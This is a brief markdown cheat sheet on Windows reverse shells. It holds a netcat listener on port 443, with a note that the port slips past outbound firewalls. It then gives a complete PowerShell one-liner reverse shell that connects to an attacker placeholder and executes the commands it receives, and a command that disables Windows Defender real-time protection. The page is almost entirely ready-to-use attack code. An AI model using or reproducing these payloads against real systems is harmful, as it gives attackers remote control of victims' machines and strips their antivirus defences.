# Windows Reverse Shells
```table-of-contents
```
## Reverse Shell Theory
### 1. Listener (Attacker)
```shell
# We use port 443 because it mimics HTTPS traffic, 
# which is rarely blocked by outbound firewalls.
sudo nc -lvnp 443
```
## PowerShell Payload (Windows)
### The Payload
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
### AV Evasion (Windows Defender)
**Bypass Command:**
```powershell
# Run as Administrator
Set-MpPreference -DisableRealtimeMonitoring $true
```